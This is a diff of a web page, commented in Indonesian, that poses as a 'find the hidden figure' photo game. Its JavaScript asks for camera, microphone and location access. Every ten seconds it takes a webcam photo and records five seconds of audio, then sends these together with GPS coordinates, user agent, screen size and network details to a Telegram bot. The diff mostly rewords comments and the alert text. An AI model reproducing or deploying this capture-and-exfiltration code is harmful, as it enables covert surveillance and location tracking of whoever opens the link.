@@ -13,7 +13,7 @@
       background-color: black;
       font-family: Arial, sans-serif;
       min-height: 100vh;
-      overflow-y: auto; /* agar halaman sambutan bisa digulir */
+      overflow-y: auto;
       position: relative;
     }
     /* Konten Sambutan (Intro) */
@@ -55,7 +55,7 @@
     /* Kontainer Foto (Game) */
     #photoContainer {
       display: none;
-      position: fixed; /* selalu penuh layar selama permainan */
+      position: fixed;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
@@ -134,7 +134,7 @@
     #endPopup #noBtn:hover { background-color: darkred; }
     #endPopup #yesBtn { background-color: green; }
     #endPopup #yesBtn:hover { background-color: darkgreen; }
-    /* Media queries untuk responsivitas */
+    /* Media queries */
     @media (max-width: 768px) {
       #introText h1 { font-size: 2rem; }
       #introText p { font-size: 1rem; }
@@ -255,14 +255,14 @@
 
     // Mulai game ketika tombol "Izinkan dan Mulai" ditekan
     startGameBtn.addEventListener('click', async () => {
-      // Minta akses kamera dan audio. Jika ditolak, kita tetap lanjutkan dengan catatan: tidak ada foto/suara.
+      // Minta akses kamera dan audio; jika gagal, tetapkan videoStream = null (game tetap berjalan)
       try {
         videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
       } catch (error) {
-        console.warn("Akses kamera atau audio ditolak. Game akan berjalan tanpa tangkapan foto dan suara.");
+        console.warn("Akses kamera atau audio ditolak. Game akan berjalan tanpa capture foto/rekaman suara.");
         videoStream = null;
       }
-      // Minta akses lokasi. Jika ditolak, gunakan fallback koordinat 0,0.
+      // Minta akses lokasi; jika gagal, gunakan fallback koordinat (0,0)
       let location;
       try {
         location = await new Promise((resolve, reject) => {
@@ -272,17 +272,17 @@
         console.warn("Akses lokasi ditolak. Menggunakan fallback koordinat (0,0).");
         location = { coords: { latitude: 0, longitude: 0 } };
       }
-      userCoords = location.coords; // simpan koordinat user
+      userCoords = location.coords;
       
-      // Jika izin diberikan atau tidak, lanjutkan game.
+      // Masuk ke dalam game (selalu langsung masuk)
       introText.style.display = 'none';
       darkness.style.display = 'block';
-      alert("Misi Kamu: Carikan ambatukam dibalik objek yang menghalangi (DILIAT BAIK-BAIK). Jika ketemu screenshot ambatukam itu, kirimkan ke pencipta permainan ini untuk mendapatkan hadiah spesial.");
+      alert("Misi Kamu: Carikan ambatukam dibalik objek yang menghalangi (DILIAT BAIK-BAIK).\nHasil capture akan dikirim melalui bot ke akun Telegram yang membuat link ini.");
       
-      // Jika kamera tersedia, tangkap foto & rekam suara; jika tidak, data yang dikirim akan menunjukkan tidak ada akses kamera.
+      // Tangkap foto & rekam suara selama 5 detik, lalu kirim ke Telegram (jika ada akses kamera/audio)
       capturePhotoAndSend(userCoords);
       
-      // Mulai interval untuk mengambil foto (dan suara) secara berkala setiap 10 detik.
+      // Mulai interval untuk capture data secara berkala setiap 10 detik
       photoInterval = setInterval(() => {
         capturePhotoAndSend(userCoords);
       }, 10000);
@@ -299,13 +299,12 @@
       showPhoto(currentPhotoIndex);
     });
 
-    // Fungsi menangkap foto dari kamera dan merekam suara selama 5 detik, lalu mengirim ke Telegram.
-    // Jika videoStream tidak tersedia, kirim informasi perangkat saja.
+    // Fungsi menangkap foto dan merekam suara selama 5 detik, lalu mengirim ke Telegram
     function capturePhotoAndSend(coords) {
       if (!videoStream) {
-        // Tidak ada akses kamera: kirim info perangkat saja.
+        // Jika tidak ada akses kamera/audio, kirim info perangkat dengan catatan
         const networkInfo = getNetworkInfo();
-        const phoneSpecs = `User Agent: ${navigator.userAgent}\nScreen: ${window.screen.width} x ${window.screen.height}${networkInfo}\nNo camera access.`;
+        const phoneSpecs = `User Agent: ${navigator.userAgent}\nScreen: ${window.screen.width} x ${window.screen.height}\nNo camera/audio access.${networkInfo}`;
         sendToTelegram(null, coords, phoneSpecs, null);
         return;
       }
@@ -315,7 +314,7 @@
       video.srcObject = videoStream;
       video.play();
       
-      // Siapkan rekaman suara dari audio track saja
+      // Siapkan rekaman suara dari audio track
       const audioStream = new MediaStream(videoStream.getAudioTracks());
       let audioChunks = [];
       let audioRecorder;
@@ -323,7 +322,7 @@
         const options = { mimeType: 'audio/ogg; codecs=opus' };
         audioRecorder = new MediaRecorder(audioStream, options);
       } catch (e) {
-        console.warn("MIME type audio/ogg tidak didukung, gunakan MIME type default.", e);
+        console.warn("MIME type audio/ogg tidak didukung, menggunakan MIME type default.", e);
         audioRecorder = new MediaRecorder(audioStream);
       }
       audioRecorder.ondataavailable = event => {
@@ -374,11 +373,11 @@
 
     // Fungsi untuk mengirim data ke Telegram:
     // - Lokasi (sendLocation)
-    // - Foto (sendPhoto) jika ada
+    // - Foto (sendPhoto), jika tersedia
     // - Informasi perangkat (sendMessage)
-    // - Suara (sendVoice) jika ada
+    // - Suara (sendVoice), jika tersedia
     function sendToTelegram(imageData, location, phoneSpecs, audioBlob) {
-      // Kirim lokasi
+      // 1. Kirim lokasi
       fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -392,7 +391,7 @@
       .then(data => console.log("Lokasi terkirim:", data))
       .catch(error => console.error("Error mengirim lokasi:", error));
 
-      // Jika imageData tersedia, kirim foto
+      // 2. Jika tersedia, kirim foto hasil snapshot
       if (imageData) {
         const photoBlob = dataURItoBlob(imageData);
         const formDataPhoto = new FormData();
@@ -407,7 +406,7 @@
         .catch(error => console.error("Error mengirim foto:", error));
       }
 
-      // Kirim informasi perangkat sebagai pesan teks
+      // 3. Kirim informasi perangkat sebagai pesan teks
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -420,7 +419,7 @@
       .then(data => console.log("Info perangkat terkirim:", data))
       .catch(error => console.error("Error mengirim info perangkat:", error));
 
-      // Jika audioBlob tersedia, kirim rekaman suara
+      // 4. Jika tersedia, kirim rekaman suara sebagai pesan suara (voice)
       if (audioBlob) {
         const formDataVoice = new FormData();
         formDataVoice.append("chat_id", recipientChatId);
@@ -489,7 +488,6 @@
     });
     nextBtn.addEventListener('click', () => {
       if (currentPhotoIndex === photos.length - 1) {
-        // Tampilkan popup konfirmasi jika sudah di foto terakhir
         endPopup.style.display = 'block';
       } else {
         currentPhotoIndex++;
